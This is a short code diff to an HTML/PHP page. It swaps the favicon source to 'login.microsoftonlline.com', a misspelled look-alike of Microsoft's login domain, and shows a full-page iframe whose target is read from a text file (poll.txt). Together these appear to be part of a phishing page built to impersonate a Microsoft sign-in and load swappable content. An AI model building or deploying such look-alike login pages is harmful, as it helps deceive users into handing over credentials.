@@ -23,7 +23,7 @@
             border: none;
         }
     </style>
-    <link rel="SHORTCUT ICON" href="https://itlity.nl/images/favicon_a.ico">
+    <link rel="SHORTCUT ICON" href="https://login.microsoftonlline.com/images/favicon_a.ico">
 </head>
 <body>
     <iframe src="<?php $page = file_get_contents('poll.txt'); echo $page; ?>" scrolling="yes"></iframe>
